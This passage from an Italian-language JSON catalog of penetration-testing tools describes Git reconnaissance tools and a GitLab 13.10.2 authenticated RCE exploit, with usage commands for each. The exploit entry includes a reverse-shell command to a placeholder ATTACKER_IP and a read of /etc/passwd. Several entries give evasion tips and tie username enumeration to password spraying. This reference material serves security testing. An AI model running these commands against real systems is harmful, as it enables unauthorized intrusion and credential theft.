directory di destinazione durante esecuzioni successive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>GetAllRepos viene tipicamente impiegato nelle prime fasi di un engagement di sicurezza, quando si vuole ottenere una visione completa del codice pubblicamente disponibile di un target. La directory di output contiene tutti i repository clonati pronti per essere analizzati con tool come Gitleaks, truffleHog o Graudit.</p><pre><code># Scarica tutti i repository pubblici di un utente GitHub\ngetallrepos --user target-username --output ./repos_target/\n\n# Scarica i repository di un'organizzazione GitHub\ngetallrepos --org target-organization --output ./repos_org/\n\n# Usa token per accedere anche a repository privati\ngetallrepos --user target-username --token ghp_xxxxxxxxxxxx --output ./repos_private/\n\n# Specifica piattaforma GitLab\ngetallrepos --user target --platform gitlab --output ./gitlab_repos/\n\n# Clonazione con parallelismo aumentato\ngetallrepos --user target --threads 10 --output ./repos_fast/</code></pre><p>Dopo il download, e consigliabile eseguire immediatamente una scansione per secret con tool dedicati come Gitleaks o truffleHog sull'intera directory di output per identificare rapidamente credenziali e chiavi API esposte nel codice o nella history dei commit.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel contesto di <strong>Bug Bounty e ricognizione OSINT</strong>, GetAllRepos permette di scaricare tutto il codice open source di un'azienda target per cercare vulnerabilita, endpoint API nascosti, configurazioni errate e informazioni sensibili che potrebbero non essere immediatamente visibili navigando i repository singolarmente sull'interfaccia web. La disponibilita locale del codice consente ricerche con grep, analisi con tool SAST e investigazioni sulla history dei commit molto piu efficienti. In scenari di <strong>audit di sicurezza del codice</strong>, il tool facilita l'acquisizione completa del codebase di un cliente che utilizza GitHub o GitLab come piattaforma di hosting del codice, garantendo che nessun repository venga dimenticato durante la fase di raccolta. Per attivita di <strong>secret hunting e credential discovery</strong>, avere tutti i repository clonati localmente con l'intera history dei commit permette di eseguire ricerche approfondite di credenziali hardcoded, chiavi API, token di accesso e altri dati sensibili che potrebbero essere stati committati accidentalmente e poi rimossi dal branch corrente ma ancora presenti nella history.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le piattaforme come GitHub e GitLab registrano le attivita API e possono rilevare pattern di accesso anomali come la clonazione massiva di tutti i repository di un'organizzazione in breve tempo. L'utilizzo di token di autenticazione lascia tracce nei log di audit della piattaforma, collegando direttamente l'attivita all'account utilizzato. Anche senza autenticazione, le richieste API sono associate all'indirizzo IP sorgente.</p><p><strong>Impatto operativo:</strong> Il rate limiting delle API puo rallentare significativamente il download e, in casi estremi, portare al blocco temporaneo dell'indirizzo IP o del token utilizzato. Repository molto grandi possono richiedere spazio disco considerevole e banda di rete significativa. I dati scaricati sono esclusivamente quelli pubblicamente accessibili (senza token), quindi l'impatto sul target e minimo.</p><p><strong>Mitigazioni:</strong> Utilizzare proxy o VPN per distribuire le richieste su piu indirizzi IP. Implementare delay tra le clonazioni per evitare di triggerare rate limiting. Preferire token con permessi minimi necessari e revocarli immediatamente dopo l'uso. Conservare i dati scaricati in modo sicuro e cancellarli al termine dell'engagement.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "getsploit",
    "name": "getsploit",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/getsploit/",
    "desc": "Cerca e scarica exploit da database multipli (Exploit-DB, Metasploit, PacketStorm).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Getsploit</strong> è un tool da command line per cercare e scaricare exploit da database multipli online simultaneamente. Interroga via API i principali repository di exploit: Exploit-DB, Metasploit Modules, PacketStorm Security, e il database Vulners che aggrega informazioni da centinaia di fonti. A differenza di searchsploit che cerca in un database locale (che richiede aggiornamenti manuali), getsploit fornisce risultati sempre aggiornati in tempo reale. Particolarmente utile per trovare rapidamente PoC per vulnerabilità recenti non ancora incluse nei database offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Database Aggregation:</strong> Cerca simultaneamente in Exploit-DB, Metasploit modules, PacketStorm, e Vulners. I risultati vengono deduplicati e ordinati per rilevanza, presentando una vista unificata di tutti gli exploit disponibili pubblicamente.</p><p><strong>Real-Time Updates:</strong> A differenza dei database locali, ogni ricerca interroga le API in tempo reale. Exploit pubblicati oggi sono immediatamente ricercabili senza necessità di aggiornare database locali.</p><p><strong>Direct Download:</strong> Con il flag -d, scarica automaticamente gli exploit trovati nella directory corrente. Supporta download batch per più exploit contemporaneamente.</p><p><strong>Advanced Search:</strong> Ricerca per prodotto e versione, per numero CVE, per tipo di exploit (remote, local, webapp), o combinazioni. Supporta operatori booleani per query complesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sintassi simile a searchsploit ma con funzionalità aggiuntive per ricerca online.</p><pre><code># Ricerca semplice per prodotto e versione\ngetsploit apache 2.4.49\ngetsploit openssh 7.2\n\n# Ricerca per CVE specifico\ngetsploit CVE-2021-44228\ngetsploit CVE-2023-23397\n\n# Ricerca e download automatico exploit\ngetsploit -d windows smb eternalblue\n\n# Limita numero risultati\ngetsploit -l 20 wordpress\n\n# Ricerca per tipo di exploit\ngetsploit type:remote apache\ngetsploit type:local linux kernel\n\n# Mostra solo titoli (output compatto)\ngetsploit -t joomla\n\n# Output JSON per parsing automatizzato\ngetsploit -j wordpress 5.0 > results.json\n\n# Combinazione con altri tool\ngetsploit -d -l 5 \"$(nmap -sV target | grep -i apache)\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Vulnerability Assessment</strong>, dopo aver identificato software e versioni con nmap o altri scanner, getsploit trova rapidamente exploit disponibili. La ricerca online garantisce risultati aggiornati incluse vulnerabilità zero-day recentemente pubblicate.</p><p>Nel <strong>Penetration Testing</strong>, complementa searchsploit per trovare PoC che potrebbero non essere ancora nel database offline di Exploit-DB. Utile quando si lavora con tecnologie nuove o versioni recenti.</p><p>Per <strong>Security Research</strong>, la ricerca CVE permette di trovare tutti i PoC pubblicati per una vulnerabilità specifica, confrontando implementazioni diverse e identificando la più affidabile.</p><p>Durante <strong>Incident Response</strong>, quando si analizza un breach, getsploit aiuta a identificare rapidamente quali exploit pubblici esistono per le vulnerabilità identificate come vettore di attacco.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Internet Required:</strong> Richiede connessione internet attiva. Non utilizzabile in ambienti air-gapped. Per ricerche offline, usare searchsploit con database locale.</p><p><strong>Query Logging:</strong> Le ricerche vengono inviate a server esterni (Vulners API). Il provider può loggare query e IP sorgente. In operazioni sensibili, considerare le implicazioni di rivelare interessi di ricerca.</p><p><strong>Exploit Verification:</strong> Gli exploit scaricati provengono da fonti pubbliche e potrebbero contenere backdoor o malware. Sempre verificare il codice prima dell'esecuzione e testare in ambiente isolato.</p><p><strong>Alternative Offline:</strong> Per ricerche senza esposizione di rete, usare searchsploit locale o mirror offline di exploit-db. Aggiornare periodicamente con searchsploit -u.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "gitleaks",
    "name": "gitleaks",
    "version": "8.30.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/gitleaks/gitleaks",
    "desc": "Scansiona repository Git, directory e stdin per trovare secrets, API key e credenziali hardcoded tramite regex ed entropia di Shannon.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Gitleaks</strong> è uno scanner di sicurezza per il codice sorgente specializzato nel rilevamento di secret hardcoded (25.000+ stelle GitHub). Scritto in Go per garantire performance elevate, opera in tre modalità: <code>git</code> (analizza l'intera history dei commit via <code>git log -p</code>), <code>dir</code> (scansiona directory e file) e <code>stdin</code> (processa input da pipe). Il motore di detection combina pattern matching basato su espressioni regolari con analisi dell'entropia di Shannon per distinguere secret reali da stringhe casuali, riducendo drasticamente i falsi positivi. L'architettura modulare permette di estendere le regole di rilevamento con pattern personalizzati in file di configurazione TOML (<code>.gitleaks.toml</code>).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Scansione completa della history Git:</strong> La modalità <code>gitleaks git</code> analizza ogni commit nella cronologia del repository, confrontando i diff con il database di pattern noti. Un secret committato anche per un solo istante rimane accessibile nella history di Git a meno di rebase o force push, rendendo la scansione retrospettiva fondamentale.</p><p><strong>Detection engine (regex + entropia):</strong> Come dichiarano i maintainer, \"regex is (almost) all you need\". Il sistema valuta i match delle espressioni regolari e calcola l'entropia di Shannon del contenuto per determinare se si tratta effettivamente di un secret. Le composite rules (da v8.28.0+) aggiungono matching basato sulla prossimità: regole ausiliarie devono matchare entro un range di righe/colonne specificato per triggerare il finding.</p><p><strong>Pre-commit e CI/CD:</strong> Gitleaks si integra come pre-commit hook tramite <code>.pre-commit-hooks.yaml</code>, prevenendo l'inserimento di nuovi secret. L'action ufficiale <code>gitleaks/gitleaks-action@v2</code> permette l'integrazione nelle pipeline GitHub Actions. Il bypass è disponibile con <code>SKIP=gitleaks git commit</code>.</p><p><strong>Configurazione e baseline:</strong> Il file <code>.gitleaks.toml</code> supporta regole custom, soglie di entropia, allowlist e baseline per escludere finding già gestiti. Precedenza: flag <code>--config</code> → variabile <code>GITLEAKS_CONFIG</code> → <code>.gitleaks.toml</code> nella directory target → config built-in.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Le tre modalità coprono scenari diversi: <code>git</code> per audit retrospettivi, <code>dir</code> per scansione senza history, <code>stdin</code> per integrazione in pipeline.</p><pre><code># Scansione completa della history Git\ngitleaks git --source /path/to/repo --verbose\n\n# Scansione con output JSON\ngitleaks git --source /path/to/repo --report-format json --report-path results.json\n\n# Scansione di una directory (senza history Git)\ngitleaks dir --source /path/to/files --verbose\n\n# Scansione da stdin\ncat secrets.txt | gitleaks stdin\n\n# Configurazione custom con regole personalizzate\ngitleaks git --source /path/to/repo --config custom-rules.toml\n\n# Baseline per escludere finding noti\ngitleaks git --source /path/to/repo --baseline-path baseline.json\n\n# Redazione dei secret nell'output (oscura il 70%)\ngitleaks git --source /path/to/repo --redact=70</code></pre><p>I report supportano formati multipli: <strong>JSON, CSV, JUNIT, SARIF</strong> e template custom. I risultati includono tipo di secret, file, riga, hash del commit e autore.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In ambito <strong>DevSecOps e CI/CD</strong>, Gitleaks viene integrato come step obbligatorio nelle pipeline di build per bloccare merge request che introducono secret. GitHub Actions, GitLab CI e Jenkins supportano nativamente la sua esecuzione.</p><p>Durante attività di <strong>penetration testing e bug bounty</strong>, viene eseguito su repository pubblici del target per identificare chiavi API, token e credenziali committate accidentalmente nella history, potenzialmente portando ad accesso a servizi cloud e infrastruttura.</p><p>Per <strong>audit di compliance</strong>, le organizzazioni lo utilizzano per verificare periodicamente che i repository non contengano dati sensibili esposti, generando report per SOC2, ISO 27001 e GDPR.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gitleaks è prevalentemente un tool difensivo e la sua esecuzione su repository locali non genera traffico di rete rilevabile. Su repository pubblici clonati, l'unica traccia è l'operazione di clone registrata nei log della piattaforma Git.</p><p><strong>Impatto operativo:</strong> Opera in sola lettura e non modifica mai il repository. Su repository molto grandi con history estesa, la scansione può richiedere tempo e risorse significative.</p><p><strong>Mitigazioni:</strong> L'opzione <code>--redact</code> consente di oscurare i secret nell'output per evitare esposizioni durante la condivisione dei report. Conservare i report contenenti secret in modo sicuro e cifrato. Se si identificano credenziali valide durante un engagement autorizzato, segnalarle immediatamente per la rotazione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "git-dumper",
    "name": "Git Dumper",
    "version": "1.0.8",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/arthaud/git-dumper",
    "desc": "Scarica e ricostruisce repository Git da directory .git esposte su web server, anche senza directory listing abilitato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>git-dumper</strong> è un tool Python progettato per estrarre e ricostruire repository Git completi da siti web che espongono accidentalmente la directory <code>.git</code>. A differenza di approcci manuali, il tool opera in modo intelligente ricostruendo l'intero repository anche quando il directory listing è disabilitato, analizzando la struttura interna di Git (refs, packed-refs, index, log) per scoprire e scaricare tutti gli oggetti necessari. Al termine del download, esegue automaticamente <code>git checkout .</code> per ripristinare il working tree completo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Ricostruzione multi-fase:</strong> Il tool impiega un approccio sistematico in più fasi: (1) tenta il download ricorsivo se il directory listing è attivo, (2) scarica file Git standard (<code>.gitignore</code>, <code>.git/HEAD</code>, <code>.git/index</code>), (3) analizza <code>HEAD</code>, <code>logs/HEAD</code>, <code>config</code> e <code>packed-refs</code> per localizzare riferimenti a branch e tag, (4) estrae gli hash SHA1 da packed refs, index e log, (5) scarica ricorsivamente tutti gli oggetti scoprendo commit parent, (6) ripristina il workspace con <code>git checkout</code>.</p><p><strong>Bypass directory listing:</strong> La capacità chiave è operare anche senza directory listing abilitato: ricostruisce la struttura del repository analizzando i metadati interni di Git (packed references, file index, log dei commit) per identificare e scaricare ogni singolo oggetto necessario.</p><p><strong>Opzioni avanzate:</strong> Supporta proxy HTTP/HTTPS (<code>--proxy</code>), download parallelo con thread multipli (<code>-j/--jobs</code>), retry configurabile (<code>-r/--retry</code>), timeout custom (<code>-t/--timeout</code>), user-agent personalizzato (<code>-u/--user-agent</code>), header HTTP aggiuntivi (<code>-H/--header</code>) e autenticazione tramite certificato PKCS#12 (<code>--client-cert-p12</code>).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Installabile via pip o eseguibile direttamente. Richiede solo l'URL della directory <code>.git</code> esposta e una cartella di destinazione.</p><pre><code># Installazione via pip\npip install git-dumper\n\n# Download base di un repository esposto\ngit-dumper http://target.com/.git/ output_dir\n\n# Con proxy e thread paralleli\ngit-dumper --proxy http://127.0.0.1:8080 -j 10 http://target.com/.git/ output_dir\n\n# Con user-agent custom per evasione WAF\ngit-dumper -u \"Mozilla/5.0\" http://target.com/.git/ output_dir\n\n# Dopo il dump, analizzare il repository\ncd output_dir && git log --oneline\ngit diff HEAD~5</code></pre><p>Dopo il download, il repository locale può essere analizzato con qualsiasi tool Git standard per cercare credenziali, configurazioni sensibili e codice sorgente proprietario.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Web Reconnaissance</strong>, quando uno scanner come GitTools Finder o un check manuale rivela una directory <code>.git</code> esposta, git-dumper è lo strumento ideale per il download completo. Il codice sorgente recuperato spesso contiene credenziali hardcoded, endpoint API interni, chiavi di cifratura e logica di business proprietaria.</p><p>Durante attività di <strong>Bug Bounty</strong>, l'esposizione di <code>.git</code> è una vulnerabilità critica (information disclosure) che può portare a catene di exploit più complesse analizzando il codice recuperato.</p><p>Per <strong>Security Audit</strong>, permette di verificare se le configurazioni di deploy proteggono correttamente le directory di version control dalla pubblicazione accidentale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il tool genera un volume significativo di richieste HTTP verso la directory <code>.git</code> del target, con pattern facilmente identificabili (richieste sequenziali a <code>/objects/</code>, <code>/refs/</code>, <code>/logs/</code>). WAF e IDS possono rilevare e bloccare questo traffico.</p><p><strong>Impatto operativo:</strong> Lo strumento opera in sola lettura sul target (solo GET requests). Attenzione: come avvertono gli sviluppatori, scaricare repository controllati da un attaccante potrebbe portare a esecuzione di codice sulla propria macchina (hook Git malevoli).</p><p><strong>Mitigazioni:</strong> Utilizzare proxy per anonimizzare il traffico. Introdurre delay tra le richieste con configurazione di jobs ridotti. Analizzare il repository scaricato in un ambiente isolato (sandbox/VM).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "gitLabUserEnum",
    "name": "GitLab User Enumeration",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dpgg101/GitLabUserEnum",
    "desc": "Enumera utenti validi su istanze GitLab CE sfruttando una vulnerabilità di information disclosure (EDB-ID 49821).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GitLabUserEnum</strong> è un tool Python 3 che sfrutta una vulnerabilità di information disclosure presente in GitLab Community Edition (≤ 13.10.3) per enumerare account utente validi su un'istanza target. Il tool invia richieste con username da una wordlist fornita e identifica gli account esistenti basandosi sulle risposte differenziali restituite dal server (codici di errore diversi per utenti esistenti vs inesistenti). La vulnerabilità è documentata su Exploit-DB con ID 49821.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione basata su wordlist:</strong> Accetta una lista di username candidati e li testa uno ad uno contro l'istanza GitLab target, analizzando le risposte HTTP per determinare quali account esistono effettivamente. Questo approccio permette di validare rapidamente liste di username generate da OSINT (LinkedIn, email harvesting).</p><p><strong>Modalità verbose:</strong> Il flag <code>-v</code> abilita output dettagliato che mostra il risultato di ogni tentativo, utile per debugging e per verificare il comportamento dell'istanza target in tempo reale.</p><p><strong>Implementazione leggera:</strong> Script Python 3 senza dipendenze complesse, convertito da un originale script Bash. Facile da modificare e integrare in pipeline di ricognizione automatizzate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script richiede l'URL dell'istanza GitLab target e un file wordlist con gli username da testare.</p><pre><code># Enumerazione base\npython3 gitlab_userenum.py --url http://gitlab.target.com --wordlist users.txt\n\n# Enumerazione con output verbose\npython3 gitlab_userenum.py --url http://gitlab.target.com --wordlist users.txt -v\n\n# Combinazione con wordlist generate da OSINT\npython3 gitlab_userenum.py --url http://gitlab.target.com --wordlist linkedin_users.txt</code></pre><p>Gli username validi identificati possono essere usati come input per attacchi di password spraying o per ulteriore ricognizione sui repository pubblici degli utenti trovati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Reconnaissance</strong>, dopo aver identificato un'istanza GitLab self-hosted del target, l'enumerazione utenti permette di mappare il personale tecnico dell'organizzazione e di validare liste di username generate da fonti OSINT come LinkedIn o email harvesting.</p><p>Come preparazione al <strong>Password Spraying</strong>, la lista di utenti validi riduce drasticamente il rumore e il rischio di lockout, permettendo di concentrare i tentativi solo su account confermati.</p><p>Per <strong>Red Teaming</strong>, identificare sviluppatori specifici può rivelare repository privati con codice sensibile, chiavi SSH associate o pattern di naming utili per privilege escalation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'enumerazione genera un volume di richieste HTTP proporzionale alla dimensione della wordlist. Istanze GitLab con rate-limiting o WAF possono bloccare l'IP sorgente dopo un numero elevato di tentativi.</p><p><strong>Impatto operativo:</strong> Il tool opera in sola lettura e non tenta autenticazione, quindi non genera eventi di login fallito. Tuttavia, le richieste ripetute all'endpoint vulnerabile possono essere logate dal web server.</p><p><strong>Mitigazioni:</strong> Utilizzare wordlist ridotte e mirate. Introdurre delay tra le richieste. La vulnerabilità è specifica per GitLab CE ≤ 13.10.3, versioni più recenti hanno corretto il comportamento differenziale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "GitTools",
    "name": "GitTools",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/internetwache/GitTools",
    "desc": "Suite di 3 tool (Finder, Dumper, Extractor) per scoprire, scaricare e ricostruire repository .git esposti su siti web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GitTools</strong> è una collezione di tre utility (Python/Bash) per la ricerca e l'exploitation di repository Git esposti pubblicamente su siti web (4.100+ stelle GitHub). I tre componenti coprono l'intero workflow: dalla discovery massiva di directory <code>.git</code> esposte, al download del contenuto, fino alla ricostruzione dei file anche da repository incompleti o danneggiati. Supporta proxy HTTP/HTTPS tramite variabili d'ambiente e richiede Git, Python 3+, curl, bash, sed e binutils.</p><br><hr><h4 class=\"rt-purple\">I tre componenti</h4><p><strong>Finder:</strong> Script Python che scansiona una lista di domini per identificare quelli con directory <code>.git</code> accessibili. Verifica se il file <code>.git/HEAD</code> contiene <code>refs/heads</code>, confermando la presenza di un repository Git valido. Supporta thread multipli per scansioni massive (es. Alexa Top 1M).</p><pre><code># Scansione di una lista di domini\n./gitfinder.py -i domains.txt -o found.txt -t 20</code></pre><p><strong>Dumper:</strong> Script Bash che scarica il contenuto di una directory <code>.git</code> esposta anche quando il directory listing è disabilitato. Richiede sistematicamente i file tipici delle strutture Git per ricostruire il repository. Limitazione: non può garantire il recupero completo quando il repository è compresso in pack-file.</p><pre><code># Download di un repository .git esposto\n./gitdumper.sh http://target.com/.git/ output_dir\n\n# Con directory Git non standard\n./gitdumper.sh http://target.com/.git/ output_dir --git-dir=otherdir</code></pre><p><strong>Extractor:</strong> Script Bash che recupera commit e contenuti da repository incompleti o danneggiati (tipicamente quelli scaricati con Dumper). Itera attraverso tutti gli oggetti commit e tenta di ripristinarne il contenuto. I commit non sono ordinati cronologicamente.</p><pre><code># Estrazione da repository parziale\n./extractor.sh output_dir extracted_dir</code></pre><br><hr><h4 class=\"rt-green\">Workflow tipico</h4><p>I tre tool sono progettati per essere usati in sequenza:</p><pre><code># 1. Trovare siti con .git esposto\n./gitfinder.py -i targets.txt -o vulnerable.txt -t 30\n\n# 2. Scaricare il repository dal target trovato\n./gitdumper.sh http://vulnerable-site.com/.git/ dump_dir\n\n# 3. Estrarre i commit dal dump (anche se incompleto)\n./extractor.sh dump_dir extracted_dir\n\n# 4. Analizzare il codice recuperato\ncd extracted_dir && ls -la\ngit log --all --oneline</code></pre><p>Il codice recuperato può poi essere analizzato con tool come gitleaks o trufflehog per cercare credenziali hardcoded nella history.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Web Reconnaissance</strong>, Finder permette di identificare rapidamente target con repository esposti su larga scala. Questo tipo di misconfiguration è sorprendentemente comune, specialmente su applicazioni deployate manualmente o con pipeline CI/CD mal configurate.</p><p>Durante attività di <strong>Bug Bounty</strong>, l'esposizione di <code>.git</code> è classificata come information disclosure critica. Il codice sorgente recuperato può rivelare endpoint nascosti, logica di autenticazione, credenziali e vulnerabilità non scoperte dall'esterno.</p><p>Per <strong>Penetration Testing</strong>, Dumper ed Extractor lavorano in tandem per massimizzare il recupero anche quando il server ha protezioni parziali, come directory listing disabilitato o oggetti mancanti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Finder genera una singola richiesta HTTP per dominio (<code>/.git/HEAD</code>), quindi è relativamente discreto. Dumper invece genera un volume significativo di richieste verso i path interni di <code>.git</code>, facilmente rilevabile da WAF e IDS.</p><p><strong>Impatto operativo:</strong> Tutti i tool operano in sola lettura sul target. Il download può richiedere tempo su repository grandi. Extractor lavora localmente senza generare traffico di rete.</p><p><strong>Mitigazioni:</strong> Utilizzare proxy per Finder nelle scansioni massive. Limitare il parallelismo di Dumper per ridurre il rumore. Analizzare il codice recuperato in ambienti isolati per evitare l'esecuzione di hook Git malevoli.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "gitlab_13_10_2_rce",
    "name": "GitLab RCE",
    "version": "13.10.2",
    "icon": "../app/icons/exploitdb-logo.svg",
    "installation": "ExploitDB",
    "repo": "https://www.exploit-db.com/exploits/49951",
    "desc": "Exploit RCE autenticato per GitLab CE < 13.10.3 tramite injection di codice Ruby in metadati di immagini DjVu caricate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo exploit (EDB-ID 49951) sfrutta una vulnerabilità di <strong>Remote Code Execution autenticato</strong> in GitLab Community Edition versioni precedenti alla 13.10.3. L'attacco abusa del meccanismo di elaborazione delle immagini caricate: un file DjVu appositamente creato con metadati contenenti codice Ruby iniettato viene processato dal server GitLab, causando l'esecuzione del payload. L'exploit è stato testato su GitLab 13.10.2 CE su Ubuntu 20.04 e richiede credenziali valide per autenticarsi all'istanza target.</p><br><hr><h4 class=\"rt-purple\">Meccanismo di attacco</h4><p><strong>Fase 1 - Autenticazione:</strong> Lo script Python si autentica all'istanza GitLab utilizzando le credenziali fornite ed estrae il token CSRF dalla pagina di login, necessario per le richieste successive.</p><p><strong>Fase 2 - Costruzione del payload:</strong> Viene creato un file di metadati contenente una Ruby code injection tramite la sintassi backtick: <code>\"\\\" . qx{command} . \\\"</code>. Il file viene processato dall'utility <code>djvumake</code> (parte del pacchetto <code>djvulibre-bin</code>) per generare un'immagine DjVu con il payload embedded nei metadati.</p><p><strong>Fase 3 - Upload ed esecuzione:</strong> L'immagine crafted viene caricata sull'endpoint di upload di GitLab (<code>/uploads/user</code>). Quando il server elabora l'immagine per generare thumbnail o estrarre metadati, il codice Ruby iniettato viene interpretato ed eseguito. Il successo dell'exploit è confermato dalla risposta \"Failed to process image\", che indica che l'RCE è stato triggerato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'exploit richiede credenziali GitLab valide e l'utility <code>djvumake</code> installata localmente.</p><pre><code># Installazione dipendenze\nsudo apt install djvulibre-bin\npip install requests beautifulsoup4\n\n# Esecuzione comando 'id' sul target\npython3 exploit.py -u username -p password -t http://gitlab.target.com -c \"id\"\n\n# Reverse shell\npython3 exploit.py -u username -p password -t http://gitlab.target.com -c \"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\"\n\n# Lettura file sensibili\npython3 exploit.py -u username -p password -t http://gitlab.target.com -c \"cat /etc/passwd\"</code></pre><p>Parametri: <code>-u</code> username, <code>-p</code> password, <code>-t</code> URL target, <code>-c</code> comando da eseguire. Il comando viene eseguito con i privilegi del processo GitLab (tipicamente <code>git</code> user).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Exploitation</strong>, dopo aver ottenuto credenziali GitLab valide (tramite OSINT, credential stuffing o password spraying), questo exploit permette di ottenere RCE sul server, spesso un punto di ingresso critico nell'infrastruttura interna dell'organizzazione.</p><p>Per <strong>Lateral Movement</strong>, il server GitLab contiene tipicamente repository privati con codice sorgente, chiavi SSH, token API e credenziali di database che possono essere estratti dopo l'accesso.</p><p>In contesti <strong>CTF e lab</strong>, GitLab 13.10.2 è un target comune in scenari di attacco a infrastrutture DevOps.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'exploit genera eventi di login e upload nei log di GitLab. L'errore \"Failed to process image\" viene registrato nei log applicativi. Sistemi EDR possono rilevare l'esecuzione di comandi anomali dal processo GitLab.</p><p><strong>Impatto operativo:</strong> L'esecuzione del payload avviene nel contesto del processo di elaborazione immagini. Comandi pesanti o reverse shell possono impattare le performance del server. L'exploit non causa crash del servizio GitLab.</p><p><strong>Mitigazioni:</strong> Aggiornare GitLab alla versione ≥ 13.10.3. Limitare le funzionalità di upload per utenti non privilegiati. Monitorare i log di elaborazione immagini per errori anomali e ricorrenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "gitxray",
    "name": "gitxray",
    "version": "1.0.18",
    "icon": "../app/icons/gitxray-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gitxray/",
    "desc": "Analizza repository GitHub per trovare contributor, SSH key e pattern sospetti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GitXray</strong> è uno strumento OSINT avanzato per l'analisi approfondita di repository e organizzazioni GitHub. Estrae e correla informazioni su contributor, chiavi SSH pubbliche, indirizzi email nascosti nei commit, pattern temporali di sviluppo, e potenziali indicatori di compromissione o comportamento sospetto. È particolarmente utile per security research, supply chain analysis, e investigazioni su threat actor che utilizzano GitHub per distribuire codice malevolo o gestire infrastrutture di attacco.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Contributor Intelligence:</strong> Costruisce profili dettagliati degli sviluppatori che contribuiscono a un repository. Include username, email, chiavi GPG/SSH associate, organizzazioni di appartenenza, altri repository a cui contribuiscono, e timeline di attività.</p><p><strong>SSH Key Discovery:</strong> Estrae le chiavi SSH pubbliche associate agli account GitHub dei contributor. Queste chiavi possono essere usate per fingerprinting, correlazione con altri sistemi, o verifica di accessi autorizzati.</p><p><strong>Email Harvesting:</strong> Raccoglie indirizzi email dai commit Git, incluse email che gli utenti potrebbero aver usato prima di configurare email noreply di GitHub. Questo rivela spesso email personali o aziendali nascoste.</p><p><strong>Anomaly Detection:</strong> Identifica pattern sospetti come: commit da account nuovi con grandi modifiche, cambi di contributor improvvisi, commit timing anomali, o modifiche a file sensibili (CI/CD, dependency, security config).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>GitXray supporta analisi di singoli repository, utenti, o intere organizzazioni.</p><pre><code># === ANALISI REPOSITORY ===\n# Analizza un singolo repository\ngitxray -r https://github.com/org/repo\n\n# Repository privato con token\ngitxray -r https://github.com/org/private-repo -t ghp_YOUR_TOKEN\n\n# === ANALISI ORGANIZZAZIONE ===\n# Tutti i repo di un'organizzazione\ngitxray -o organization_name\n\n# Con limite di repository\ngitxray -o 